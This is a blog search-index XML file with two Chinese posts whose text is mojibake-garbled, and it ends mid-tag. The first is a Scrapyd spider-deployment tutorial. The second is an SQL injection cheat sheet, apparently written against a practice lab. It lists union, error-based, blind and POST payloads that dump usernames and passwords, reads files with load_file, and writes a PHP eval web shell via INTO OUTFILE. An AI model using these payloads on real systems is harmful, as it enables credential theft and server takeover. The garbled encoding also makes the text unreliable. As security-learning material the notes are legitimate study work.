<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title>åˆ©ç”¨Scrapydå°†çˆ¬è™«éƒ¨ç½²åˆ°è¿œç¨‹æœåŠ¡å™¨</title>
      <link href="/2019/03/22/li-yong-scrapyd-jiang-pa-chong-bu-shu-dao-yuan-cheng-fu-wu-qi/"/>
      <url>/2019/03/22/li-yong-scrapyd-jiang-pa-chong-bu-shu-dao-yuan-cheng-fu-wu-qi/</url>
      
        <content type="html"><![CDATA[<h1 id="è¿œç¨‹æœåŠ¡å™¨é…ç½®"><a href="#è¿œç¨‹æœåŠ¡å™¨é…ç½®" class="headerlink" title="è¿œç¨‹æœåŠ¡å™¨é…ç½®"></a>è¿œç¨‹æœåŠ¡å™¨é…ç½®</h1><h2 id="å®‰è£…Scrapyd"><a href="#å®‰è£…Scrapyd" class="headerlink" title="å®‰è£…Scrapyd"></a>å®‰è£…Scrapyd</h2><pre><code>1. å®‰è£…scrapyd    pip install scrapyd2. æœåŠ¡å™¨å¼€å¯6800ç«¯å£è¿œç¨‹è®¿é—®3. ä¿®æ”¹scrapydçš„Ipç»‘å®š    åœ¨default_scrapyd.confæ–‡ä»¶ä¸­å°†bind_addressä¿®æ”¹ä¸º0.0.0.0        bind_address=0.0.0.0é»˜è®¤ä¸º127.0.0.14. å¼€å¯Scrapyd    shellä¸‹è¿è¡Œscrapyd</code></pre><h2 id="æµ‹è¯•"><a href="#æµ‹è¯•" class="headerlink" title="æµ‹è¯•"></a>æµ‹è¯•</h2><pre><code>æµè§ˆå™¨ä¸­è¾“å…¥æœåŠ¡å™¨çš„Ipåœ°å€å¦‚æœèƒ½å¤Ÿæ­£å¸¸è®¿é—®åˆ™è¡¨ç¤ºscrapydé…ç½®æˆåŠŸ</code></pre><p><img src="https://m.qpic.cn/psb?/V14KwPpr1dBZ4U/kut.F*J631wX9NhxW5SEdQtstrApCVarvV.f8R9xaLY!/b/dD4BAAAAAAAA&amp;bo=zgMfAgAAAAADB*I!&amp;rf=viewer_4" alt=""></p><h1 id="å®¢æˆ·ç«¯é…ç½®"><a href="#å®¢æˆ·ç«¯é…ç½®" class="headerlink" title="å®¢æˆ·ç«¯é…ç½®"></a>å®¢æˆ·ç«¯é…ç½®</h1><p>scrapyd-client:å°†æœ¬åœ°scrapyé¡¹ç›®æ‰“åŒ…å‘é€åˆ°scrapydçš„æœåŠ¡ç«¯</p><h2 id="å®‰è£…Scrapyd-client"><a href="#å®‰è£…Scrapyd-client" class="headerlink" title="å®‰è£…Scrapyd-client"></a>å®‰è£…Scrapyd-client</h2><pre><code>pip install scrapyd-client</code></pre><h2 id="ä¿®æ”¹scrapyé…ç½®æ–‡ä»¶"><a href="#ä¿®æ”¹scrapyé…ç½®æ–‡ä»¶" class="headerlink" title="ä¿®æ”¹scrapyé…ç½®æ–‡ä»¶"></a>ä¿®æ”¹scrapyé…ç½®æ–‡ä»¶</h2><p>åœ¨Scrapyé¡¹ç›®ç›®å½•ä¸‹æœ‰ä¸€ä¸ªå«scrapy.cfgçš„Scrapyé…ç½®æ–‡ä»¶.</p><pre><code>â”‚  scrapy.cfg(Scrapyé¡¹ç›®é…ç½®æ–‡ä»¶)â”‚  setup.pyâ”‚  start.pyâ””â”€YangGuangGaoKao    â”‚  items.py    â”‚  middlewares.py    â”‚  pipelines.py    â”‚  settings.py(scrapyè®¾ç½®æ–‡ä»¶)    â”‚  __init__.py    â”‚    â”œâ”€spiders    â”‚  â”‚  IndexSpider.py(çˆ¬è™«)    â”‚  â”‚  __init__.py    â”‚    â”œâ”€utils    â”‚      logger.py</code></pre><p>å°†scrapy.cfgæ–‡ä»¶ä¿®æ”¹æˆä¸‹é¢çš„è¿™ç§æ ¼å¼</p><pre><code>- urlæ˜¯scrapydæœåŠ¡å™¨çš„URLåœ°å€- projectæ˜¯scrapydçš„é¡¹ç›®åå­—[settings]default = YangGuangGaoKao.settings[deploy:gaokao]url = http://0.0.0.0:6800/       # Spider Server Urlproject = YangGuangGaoKao</code></pre><p>åˆ‡è®°scrapy.cfgæ–‡ä»¶ä¸­<strong>ä¸èƒ½ä½¿ç”¨ä¸­æ–‡æ³¨é‡Š</strong></p><p>å¦åˆ™ä¼šæŠ¥<strong>UnicodeDecodeError: â€˜gbkâ€™ codec canâ€™t decode byte 0xae in position 175</strong></p><h2 id="éƒ¨ç½²"><a href="#éƒ¨ç½²" class="headerlink" title="éƒ¨ç½²"></a>éƒ¨ç½²</h2><p>åœ¨scrapy.cfgçš„<strong>åŒçº§ç›®å½•</strong>ä¸‹è¿è¡Œ<strong>scrapyd-deploy</strong>å‘½ä»¤,å¦‚æœåœ¨Windowsä¸‹è¿è¡Œè¿™ä¸ªå‘½ä»¤ä¼šæŠ¥é”™æ‰¾ä¸åˆ°è¯¥å‘½ä»¤.</p><p>è§£å†³æ–¹æ³•:</p><pre><code>åœ¨è‡ªå·±çš„Pythonå®‰è£…ç›®å½•ä¸­æ‰¾åˆ°Scriptsç›®å½•è¿™ä¸ªç›®å½•ä¸­æœ‰ä¸ªscrapyd-deployæ–‡ä»¶,è¿™ä¸ªæ–‡ä»¶æ²¡æœ‰ä»»ä½•åç¼€,æ‰€ä»¥æ— æ³•æ‰§è¡Œ.åœ¨Scriptsç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªscrapyd-deploy.batæ–‡ä»¶</code></pre><p>å†™å…¥ä¸‹é¢çš„å†…å®¹</p><pre><code>@echo off&quot;D:\Python36\python.exe&quot; &quot;D:\Python36\Scripts\scrapyd-deploy&quot; %1 %2 %3 %4 %5 %6 %7 %8 %9</code></pre><p><strong>D:\Python36\python.exe:Python.exeçš„è·¯å¾„</strong></p><p><strong>D:\Python36\Scripts\scrapyd-deploy:scrapy-deployçš„è·¯å¾„</strong></p><p>æ‰§è¡Œ<strong>scrapyd-deploy</strong></p><pre><code>L:\ScrapyProjectDemo\YangGuangGaoKao&gt;scrapyd-deployUnknown target: default</code></pre><p>å¦‚æœæ§åˆ¶å°æœ‰è¿™æ ·çš„è¾“å‡ºåˆ™è¡¨ç¤ºscrapyd-deployèƒ½å¤Ÿæ­£å¸¸æ‰§è¡Œ</p><p>å°†è‡ªå·±çš„çˆ¬è™«é¡¹ç›®éƒ¨ç½²åˆ°æœåŠ¡ç«¯</p><pre><code>scrapyd-deploy gaokao -p YangGuangGaoKao</code></pre><p><strong>gaokao</strong>:scrapy.cfgä¸­çš„â€deploy:gaokaoâ€</p><p><strong>YangGuangGaoKao</strong>:scrapy.cfgä¸­çš„project=YangGuangGaoKao</p><pre><code>L:\ScrapyProjectDemo\YangGuangGaoKao&gt;scrapyd-deploy gaokao -p YangGuangGaoKaoPacking version 1553244314Deploying to project &quot;YangGuangGaoKao&quot; in http://0.0.0.0:6800/addversion.jsonServer response (200):{&quot;node_name&quot;: &quot;iZ2ze8yfs65r3ciel5lbucZ&quot;, &quot;status&quot;: &quot;ok&quot;, &quot;project&quot;: &quot;YangGuangGaoKao&quot;, &quot;version&quot;: &quot;1553244314&quot;, &quot;spiders&quot;: 3}</code></pre><p>è¿™æ ·å°±è¡¨ç¤ºéƒ¨ç½²æˆåŠŸ</p><p>è¿™æ—¶å€™åœ¨æœåŠ¡å™¨ç«¯ä¼šå¤šä¸¤ä¸ªæ–‡ä»¶å¤¹<strong>dbs,eggs</strong>æˆ‘çš„åœ¨homeç›®å½•ä¸‹ä¸çŸ¥é“ä½ ä»¬çš„åœ¨å“ªå„¿.</p><pre><code>root@iZ2ze8yfs65r3ciel5lbucZ:/home# lsdbs  eggs   twistd.pid</code></pre><h2 id="å¼€å¯æœåŠ¡ç«¯çš„çˆ¬è™«"><a href="#å¼€å¯æœåŠ¡ç«¯çš„çˆ¬è™«" class="headerlink" title="å¼€å¯æœåŠ¡ç«¯çš„çˆ¬è™«"></a>å¼€å¯æœåŠ¡ç«¯çš„çˆ¬è™«</h2><pre><code>curl http://0.0.0.0:6800/schedule.json -d project=YangGuangGaoKao -d spider=IndexSpiderYangGuangGaoKao:scrapydé¡¹ç›®åå­—IndexSpider:çˆ¬è™«åå­—</code></pre><p>å¦‚æœå¼€å¯æˆåŠŸåˆ™åœ¨<strong>ç»ˆç«¯ä¼šæ˜¾ç¤º</strong></p><pre><code>$ curl http://0.0.0.0:6800/schedule.json -d project=YangGuangGaoKao -d spider=IndexSpider    % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current Dload  Upload   Total Spent Left  Speed100   144  100   102  100    42     81     33  0:00:01  0:00:01 --:--:--    81{&quot;                             node_name&quot;: &quot;iZ2ze8yfs65r3ciel5lbucZ&quot;, &quot;status&quot;: &quot;ok&quot;, &quot;jobid&quot;: &quot;ba214a324c7f11e                             98c2700163e32604e&quot;}</code></pre><p>è¿™æ—¶å€™æˆ‘ä»¬è®¿é—®æˆ‘ä»¬æœåŠ¡ç«¯èƒ½å¤ŸæŸ¥çœ‹æˆ‘ä»¬æœåŠ¡ç«¯éƒ¨ç½²çš„çˆ¬è™«,ä»¥åŠè¿è¡Œæ—¥å¿—</p><p><img src="http://m.qpic.cn/psb?/V14KwPpr1dBZ4U/s7rWY3MODx.zDQdxptp3X14.AQM0sWtBw4ITj*w0Fxs!/b/dL8AAAAAAAAA&amp;bo=NwV6AQAAAAADF3s!&amp;rf=viewer_4" alt=""></p><p><a href="https://scrapyd.readthedocs.io/en/latest/" target="_blank" rel="noopener">å®˜æ–¹æ–‡æ¡£</a></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pythonçˆ¬è™« </tag>
            
            <tag> Scrapy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SQLæ³¨å…¥SQLMapçš„åŸºæœ¬ä½¿ç”¨</title>
      <link href="/2019/03/20/sql-zhu-ru-sqlmap-de-ji-ben-shi-yong/"/>
      <url>/2019/03/20/sql-zhu-ru-sqlmap-de-ji-ben-shi-yong/</url>
      
        <content type="html"><![CDATA[<h1 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h1><h2 id="SQLæ³¨å…¥å¸¸ç”¨ç›¸å…³å‡½æ•°"><a href="#SQLæ³¨å…¥å¸¸ç”¨ç›¸å…³å‡½æ•°" class="headerlink" title="SQLæ³¨å…¥å¸¸ç”¨ç›¸å…³å‡½æ•°"></a>SQLæ³¨å…¥å¸¸ç”¨ç›¸å…³å‡½æ•°</h2><ol><li>@@version æ•°æ®åº“ç‰ˆæœ¬</li><li>@@basedir æ•°æ®åº“è·¯å¾„</li><li>length() å­—ç¬¦ä¸²é•¿åº¦</li><li>mid(arg1,arg2,arg3) éœ€è¦æˆªå–çš„å­—ç¬¦ä¸²,arg1(éœ€è¦æˆªå–çš„å­—ç¬¦ä¸²),arg2(ä»ç¬¬å‡ ä½å¼€å§‹æˆªå–),arg3(æˆªå–é•¿åº¦)</li><li>database() å½“å‰æ•°æ®åº“çš„åå­—</li><li>@@version_compile_os æ“ä½œç³»ç»Ÿä¿¡æ¯</li><li>substring() æˆªå–å­—ç¬¦</li><li>ord() è¿”å›ASCIIå€¼</li><li>sleep() ç¡çœ æŒ‡å®šçš„ç§’æ•°</li><li>if() ifåˆ¤æ–­</li><li>group_concat() è¿æ¥ä¸€ç»„å­—ç¬¦ä¸²,å°†æŸ¥è¯¢ç»“æœæ”¾åˆ°åŒä¸€è¡Œ.</li></ol><h2 id="åˆ¤æ–­æ³¨å…¥ç‚¹"><a href="#åˆ¤æ–­æ³¨å…¥ç‚¹" class="headerlink" title="åˆ¤æ–­æ³¨å…¥ç‚¹"></a>åˆ¤æ–­æ³¨å…¥ç‚¹</h2><pre><code>å¸ƒå°”ç±»å‹and 1=2 --+å­—ç¬¦å‹id=1&#39;</code></pre><h2 id="åˆ¤æ–­æ•°æ®åº“ä¸­æœ‰å¤šå°‘å­—æ®µ"><a href="#åˆ¤æ–­æ•°æ®åº“ä¸­æœ‰å¤šå°‘å­—æ®µ" class="headerlink" title="åˆ¤æ–­æ•°æ®åº“ä¸­æœ‰å¤šå°‘å­—æ®µ"></a>åˆ¤æ–­æ•°æ®åº“ä¸­æœ‰å¤šå°‘å­—æ®µ</h2><pre><code>order by 5</code></pre><h2 id="æŸ¥è¯¢å­—æ®µ"><a href="#æŸ¥è¯¢å­—æ®µ" class="headerlink" title="æŸ¥è¯¢å­—æ®µ"></a>æŸ¥è¯¢å­—æ®µ</h2><pre><code>union select 1,2,3 --+</code></pre><h2 id="æŸ¥è¯¢æ•°æ®åº“çš„åç§°å’Œç‰ˆæœ¬"><a href="#æŸ¥è¯¢æ•°æ®åº“çš„åç§°å’Œç‰ˆæœ¬" class="headerlink" title="æŸ¥è¯¢æ•°æ®åº“çš„åç§°å’Œç‰ˆæœ¬"></a>æŸ¥è¯¢æ•°æ®åº“çš„åç§°å’Œç‰ˆæœ¬</h2><p> union select 1,database(),version() â€“+</p><h2 id="æŸ¥è¯¢è¡¨å"><a href="#æŸ¥è¯¢è¡¨å" class="headerlink" title="æŸ¥è¯¢è¡¨å"></a>æŸ¥è¯¢è¡¨å</h2><pre><code>æ ¹æ®æŸ¥è¯¢åˆ°çš„æ•°æ®åº“åæŸ¥è¯¢è¡¨å    (select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=0x7365637572697479)è¿™é‡Œçš„**0x7365637572697479**æ˜¯æ•°æ®åº“**security**çš„16è¿›åˆ¶å€¼</code></pre><h2 id="æŸ¥è¯¢å­—æ®µ-1"><a href="#æŸ¥è¯¢å­—æ®µ-1" class="headerlink" title="æŸ¥è¯¢å­—æ®µ"></a>æŸ¥è¯¢å­—æ®µ</h2><pre><code>æ ¹æ®åˆšåˆšæŸ¥è¯¢åˆ°çš„æ•°æ®åº“è¡¨çš„åå­—å»æŸ¥è¯¢è¡¨ä¸­çš„å­—æ®µåå­—è¿™é‡Œçš„**0x7573657273**è¡¨ç¤ºuserè¡¨çš„16è¿›åˆ¶å€¼union select 1,database(),(select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA=0x7365637572697479 and TABLE_NAME=0x7573657273) --+</code></pre><h2 id="æŸ¥å­—æ®µä¸­çš„æ•°æ®"><a href="#æŸ¥å­—æ®µä¸­çš„æ•°æ®" class="headerlink" title="æŸ¥å­—æ®µä¸­çš„æ•°æ®"></a>æŸ¥å­—æ®µä¸­çš„æ•°æ®</h2><pre><code>union select 1,database(),(select group_concat(concat(username,&#39;89&#39;,password)) from users) --+</code></pre><h1 id="æŠ¥é”™æ³¨å…¥"><a href="#æŠ¥é”™æ³¨å…¥" class="headerlink" title="æŠ¥é”™æ³¨å…¥"></a>æŠ¥é”™æ³¨å…¥</h1><h2 id="åˆ©ç”¨updatexml-å‡½æ•°æŸ¥è¯¢"><a href="#åˆ©ç”¨updatexml-å‡½æ•°æŸ¥è¯¢" class="headerlink" title="åˆ©ç”¨updatexml()å‡½æ•°æŸ¥è¯¢"></a>åˆ©ç”¨updatexml()å‡½æ•°æŸ¥è¯¢</h2><pre><code>and updatexml(1,concat(&#39;^&#39;,(select version()),&#39;^&#39;),1) --+and updatexml(1,concat(&#39;^&#39;,(select database()),&#39;^&#39;),1) --+</code></pre><h2 id="åˆ©ç”¨extractvalue-å‡½æ•°æŸ¥è¯¢è¡¨"><a href="#åˆ©ç”¨extractvalue-å‡½æ•°æŸ¥è¯¢è¡¨" class="headerlink" title="åˆ©ç”¨extractvalue()å‡½æ•°æŸ¥è¯¢è¡¨"></a>åˆ©ç”¨extractvalue()å‡½æ•°æŸ¥è¯¢è¡¨</h2><pre><code>and extractvalue(1,concat(&#39;^&#39;,((select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=0x7365637572697479)),&#39;^&#39;)) --+</code></pre><h2 id="æŸ¥è¯¢è¡¨ä¸­çš„å­—æ®µå"><a href="#æŸ¥è¯¢è¡¨ä¸­çš„å­—æ®µå" class="headerlink" title="æŸ¥è¯¢è¡¨ä¸­çš„å­—æ®µå"></a>æŸ¥è¯¢è¡¨ä¸­çš„å­—æ®µå</h2><pre><code>and extractvalue(1,concat(&#39;^&#39;,((select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA=0x7365637572697479 and table_name=0x7573657273)),&#39;^&#39;)) --+</code></pre><h2 id="æŸ¥è¯¢å­—æ®µå†…å®¹"><a href="#æŸ¥è¯¢å­—æ®µå†…å®¹" class="headerlink" title="æŸ¥è¯¢å­—æ®µå†…å®¹"></a>æŸ¥è¯¢å­—æ®µå†…å®¹</h2><pre><code>and extractvalue(1,concat(&#39;^&#39;,((select group_concat(concat(username,&#39;*&#39;,password)) from users)),&#39;*&#39;)) --+è¿™ç§æ–¹å¼çš„æŸ¥è¯¢æ˜¾ç¤ºçš„ä¿¡æ¯ä¸å…¨ä½¿ç”¨limitè¿›è¡Œåˆ†é¡µæŸ¥è¯¢,ç¬¬ä¸€ä¸ªå‚æ•°offsetè¡¨ç¤ºåç§»é‡,ä¹Ÿå°±æ˜¯æ•°æ®åº“ä¸­çš„è¡Œ,ç¬¬äºŒä¸ªå‚æ•°è¡¨ç¤ºè®°å½•æ•°and extractvalue(1,concat(&#39;^&#39;,((select concat(username,&#39;**&#39;,password) from users limit 0,1)),&#39;^&#39;)) --+and extractvalue(1,concat(&#39;^&#39;,((select concat(username,&#39;**&#39;,password) from users limit 1,1)),&#39;^&#39;)) --+and extractvalue(1,concat(&#39;^&#39;,((select concat(username,&#39;**&#39;,password) from users limit 3,1)),&#39;^&#39;)) --+</code></pre><h1 id="å¸ƒå°”ç›²æ³¨"><a href="#å¸ƒå°”ç›²æ³¨" class="headerlink" title="å¸ƒå°”ç›²æ³¨"></a>å¸ƒå°”ç›²æ³¨</h1><h2 id="åˆ¤æ–­æ•°æ®åº“åå­—çš„é•¿åº¦"><a href="#åˆ¤æ–­æ•°æ®åº“åå­—çš„é•¿åº¦" class="headerlink" title="åˆ¤æ–­æ•°æ®åº“åå­—çš„é•¿åº¦"></a>åˆ¤æ–­æ•°æ®åº“åå­—çš„é•¿åº¦</h2><pre><code> and length(database()) = 8 --+ and length(database()) = 10 --+length(database())æ•°æ®åº“çš„é•¿åº¦å¦‚æœé•¿åº¦ä¸º8åˆ™è¿”å›æ­£ç¡®çš„é¡µé¢,å¦‚æœé•¿åº¦ä¸ä¸º8åˆ™æŠ¥é”™.</code></pre><h2 id="åˆ¤æ–­å­—æ®µçš„ç¬¬ä¸€ä¸ªå­—æ¯"><a href="#åˆ¤æ–­å­—æ®µçš„ç¬¬ä¸€ä¸ªå­—æ¯" class="headerlink" title="åˆ¤æ–­å­—æ®µçš„ç¬¬ä¸€ä¸ªå­—æ¯"></a>åˆ¤æ–­å­—æ®µçš„ç¬¬ä¸€ä¸ªå­—æ¯</h2><pre><code>mid()å‡½æ•°:éœ€è¦æˆªå–çš„å­—ç¬¦ä¸²é•¿åº¦and mid(database(),1,1) = &#39;a&#39; --+and mid(database(),1,1) = &#39;s&#39; --+å¦‚æœæ•°æ®åº“åå­—çš„ç¬¬ä¸€ä¸ªå­—æ¯ä¸ºsåˆ™è¿”å›æ­£ç¡®çš„é¡µé¢,å¦‚æœä¸ä¸ºsåˆ™è¿”å›é”™è¯¯çš„é¡µé¢.ç¬¬äºŒç§æ–¹æ³•:ä½¿ç”¨ASCIIå€¼å¯¹æ•°æ®åº“åå­—çš„ç¬¬ä¸€ä¸ªå­—æ¯è¿›è¡Œåˆ¤æ–­and ord(mid(database(),1,1)) &gt; 130 --+å¦‚æœæ•°æ®åº“åå­—çš„ç¬¬ä¸€ä¸ªå­—æ¯çš„ASCIIå€¼åœ¨130ä»¥å†…åˆ™è¿”å›æ­£ç¡®çš„é¡µé¢,å¦‚æœä¸åœ¨åˆ™è¿”å›é”™è¯¯çš„é¡µé¢</code></pre><h1 id="å»¶æ—¶æ³¨å…¥"><a href="#å»¶æ—¶æ³¨å…¥" class="headerlink" title="å»¶æ—¶æ³¨å…¥"></a>å»¶æ—¶æ³¨å…¥</h1><h2 id="æ ¹æ®æ—¶é—´åˆ¤æ–­æ•°æ®åº“ä¸­çš„å†…å®¹"><a href="#æ ¹æ®æ—¶é—´åˆ¤æ–­æ•°æ®åº“ä¸­çš„å†…å®¹" class="headerlink" title="æ ¹æ®æ—¶é—´åˆ¤æ–­æ•°æ®åº“ä¸­çš„å†…å®¹"></a>æ ¹æ®æ—¶é—´åˆ¤æ–­æ•°æ®åº“ä¸­çš„å†…å®¹</h2><pre><code>and if(ord(mid(database(),1,1))=101,sleep(4),1) --+and if(ord(mid(database(),1,1))&gt;110,sleep(4),1) --+and if(ord(mid(database(),1,1))=115,sleep(4),1) --+</code></pre><h1 id="POSTæ³¨å…¥"><a href="#POSTæ³¨å…¥" class="headerlink" title="POSTæ³¨å…¥"></a>POSTæ³¨å…¥</h1><h2 id="ä¸»åŠ¨æŠ¥é”™æ ¹æ®æŠ¥é”™ä¿¡æ¯è¿›è¡Œåˆ†æ"><a href="#ä¸»åŠ¨æŠ¥é”™æ ¹æ®æŠ¥é”™ä¿¡æ¯è¿›è¡Œåˆ†æ" class="headerlink" title="ä¸»åŠ¨æŠ¥é”™æ ¹æ®æŠ¥é”™ä¿¡æ¯è¿›è¡Œåˆ†æ"></a>ä¸»åŠ¨æŠ¥é”™æ ¹æ®æŠ¥é”™ä¿¡æ¯è¿›è¡Œåˆ†æ</h2><pre><code>uname=test&#39;&amp;passwd=test</code></pre><h2 id="æ°¸çœŸæ¡ä»¶æµ‹è¯•-åŠ æ³¨é‡Š"><a href="#æ°¸çœŸæ¡ä»¶æµ‹è¯•-åŠ æ³¨é‡Š" class="headerlink" title="æ°¸çœŸæ¡ä»¶æµ‹è¯•,åŠ æ³¨é‡Š(#)"></a>æ°¸çœŸæ¡ä»¶æµ‹è¯•,åŠ æ³¨é‡Š(#)</h2><pre><code>uname=test&#39; or 1=1 #&amp;passwd=test</code></pre><h2 id="é—­åˆå•å¼•å·æ³¨å…¥"><a href="#é—­åˆå•å¼•å·æ³¨å…¥" class="headerlink" title="é—­åˆå•å¼•å·æ³¨å…¥"></a>é—­åˆå•å¼•å·æ³¨å…¥</h2><pre><code>uname=test&#39; or &#39;1&#39;=1&amp;passwd=test       æ³¨å…¥å¤±è´¥,å› ä¸ºæ­¤æ¡è¯­å¥çš„æŸ¥è¯¢æ–¹å¼ä¸ºselect username,password from users where username=&#39;test&#39; or &#39;1&#39;=&#39;1&#39; and password=&#39;test&#39;;åœ¨è¿™æ¡è¯­å¥ä¸­andçš„ä¼˜å…ˆçº§æ¯”orçš„é«˜,é‚£ä¹ˆ&#39;1&#39;=&#39;1&#39; and password=&#39;test&#39;å…ˆæ‰§è¡Œ,åˆå› ä¸ºpasswordå­—æ®µä¸­æ²¡æœ‰&#39;test&#39;å€¼,æ‰€ä»¥å³è¾¹ä¸ºfalse,é‚£ä¹ˆæœ€ç»ˆè¯­å¥å°±ä¼šå˜æˆselect username,password from users where username=&#39;test&#39; or false;uname=test&amp;passwd=test&#39; or &#39;1&#39;=&#39;1</code></pre><h2 id="æŸ¥çœ‹æœ‰å‡ ä¸ªå­—æ®µ"><a href="#æŸ¥çœ‹æœ‰å‡ ä¸ªå­—æ®µ" class="headerlink" title="æŸ¥çœ‹æœ‰å‡ ä¸ªå­—æ®µ"></a>æŸ¥çœ‹æœ‰å‡ ä¸ªå­—æ®µ</h2><pre><code>uname=test&amp;passwd=test&#39; order by 3 #</code></pre><h2 id="æŸ¥çœ‹ç›¸å…³ä¿¡æ¯"><a href="#æŸ¥çœ‹ç›¸å…³ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹ç›¸å…³ä¿¡æ¯"></a>æŸ¥çœ‹ç›¸å…³ä¿¡æ¯</h2><pre><code>uname=test&amp;passwd=test&#39; union select database(),user()#</code></pre><h1 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h1><h2 id="æŠ¥é”™"><a href="#æŠ¥é”™" class="headerlink" title="æŠ¥é”™"></a>æŠ¥é”™</h2><pre><code>é€šè¿‡idè¿›è¡Œä¼ å€¼?id=1&#39;?id=1%df&#39;1(31)%df(fd5c)&#39;(c27)?id=-1%df%27%20union%20select%201,2,3%20--+</code></pre><h1 id="SQLæ³¨å…¥çš„è¯»å†™æ“ä½œ"><a href="#SQLæ³¨å…¥çš„è¯»å†™æ“ä½œ" class="headerlink" title="SQLæ³¨å…¥çš„è¯»å†™æ“ä½œ"></a>SQLæ³¨å…¥çš„è¯»å†™æ“ä½œ</h1><pre><code>è¯»æ“ä½œ,ä½¿ç”¨load_file()å‡½æ•°union select 1,load_file(&#39;D:\\phpStudy\\www.\\sqli\\less-1\\123.txt&#39;),3 --+å†™æ“ä½œ,ä½¿ç”¨outfile &quot;&quot;union select 1,&quot;&lt;?php @eval($_REQUEST[&#39;cmd&#39;]);?&gt;&quot;,3 into outfile &quot;C:/xampp/htdocs/777.php&quot;%20 --+</code></pre><h1 id="SQLMapçš„åŸºæœ¬ä½¿ç”¨"><a href="#SQLMapçš„åŸºæœ¬ä½¿ç”¨" class="headerlink" title="SQLMapçš„åŸºæœ¬ä½¿ç”¨"></a>SQLMapçš„åŸºæœ¬ä½¿ç”¨</h1><h2 id="åˆ¤æ–­å½“å‰æ•°æ®åº“"><a href="#åˆ¤æ–­å½“å‰æ•°æ®åº“" class="headerlink" title="åˆ¤æ–­å½“å‰æ•°æ®åº“"></a>åˆ¤æ–­å½“å‰æ•°æ®åº“</h2><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/QkY2r7shu12dFfFLSSs84Xt09l2kUKZ4FAFXRunEOKs!/b/dLYAAAAAAAAA&amp;bo=sQY.AwAAAAADB6g!&amp;rf=viewer_4" alt="&quot;å½“å‰æ•°æ®åº“&quot;"><br><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/cZ2sa4BRnAgaSrRYgoFe3faY18NX7y4TEuTN9zactIM!/b/dLkAAAAAAAAA&amp;bo=pQY8AwAAAAADF64!&amp;rf=viewer_4" alt="&quot;å½“å‰æ•°æ®åº“&quot;"></p><h2 id="åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“"><a href="#åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“" class="headerlink" title="åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“"></a>åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“</h2><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/.O1rVUrgitpGGU4YbxOARcuwu05XJIFCECc38O8uonw!/b/dDQBAAAAAAAA&amp;bo=pgbRAQAAAAADB1I!&amp;rf=viewer_4" alt="&quot;åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“&quot;"><br><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/9Y2OkZupmAK0PBdygr9Hl3K.yMmXNZaNL19yaH*YW44!/b/dLkAAAAAAAAA&amp;bo=nAUNAgAAAAADF6Q!&amp;rf=viewer_4" alt="&quot;åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“&quot;"></p><h2 id="é€šè¿‡æ•°æ®åº“å¾—åˆ°è¡¨å"><a href="#é€šè¿‡æ•°æ®åº“å¾—åˆ°è¡¨å" class="headerlink" title="é€šè¿‡æ•°æ®åº“å¾—åˆ°è¡¨å"></a>é€šè¿‡æ•°æ®åº“å¾—åˆ°è¡¨å</h2><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/99DKEaO9mynkvRpCkztLGlQNJpV1RaYnImikDBxYvIE!/b/dL8AAAAAAAAA&amp;bo=pwb9AQAAAAADB38!&amp;rf=viewer_4" alt="&quot;é€šè¿‡æ•°æ®åº“åå­—å¾—åˆ°è¡¨å"><br><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/LVHzh1eZDOJPVv.aFIeqnULsEXpsRy*WKv7zw*h*FVs!/b/dDABAAAAAAAA&amp;bo=rwViAgAAAAADB.g!&amp;rf=viewer_4" alt="&quot;é€šè¿‡æ•°æ®åº“åå­—å¾—åˆ°è¡¨å"></p><h2 id="é€šè¿‡è¡¨åå¾—åˆ°å­—æ®µå"><a href="#é€šè¿‡è¡¨åå¾—åˆ°å­—æ®µå" class="headerlink" title="é€šè¿‡è¡¨åå¾—åˆ°å­—æ®µå"></a>é€šè¿‡è¡¨åå¾—åˆ°å­—æ®µå</h2><p><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/OASC4eUssgThaNMvHrVyXAFMVmgdART0EsrnEtvpc5k!/b/dFIBAAAAAAAA&amp;bo=sgYnAgAAAAADB7M!&amp;rf=viewer_4" alt="&quot;å¾—åˆ°å­—æ®µå&quot;"><br><img src="http://m.qpic.cn/psb?/V10Lajvl1FgUNv/6HVCbDJ5P.W7IcqCxSJ.zAlzyIiDgx64p652hGaNcEo!/b/dLgAAAAAAAAA&amp;bo=PAScAgAAAAADB4Q!&amp;rf=viewer_4" alt="&quot;å¾—åˆ°å­—æ®µå&quot;"></p><h2 id="é€šè¿‡è¡¨å­—æ®µå¾—åˆ°å­—æ®µçš„å€¼"><a href="#é€šè¿‡è¡¨å­—æ®µå¾—åˆ°å­—æ®µçš„å€¼" class="headerlink" title="é€šè¿‡è¡¨å­—æ®µå¾—åˆ°å­—æ®µçš„å€¼"></a>é€šè¿‡è¡¨å­—æ®µå¾—åˆ°å­—æ®µçš„å€¼</h2><p><img 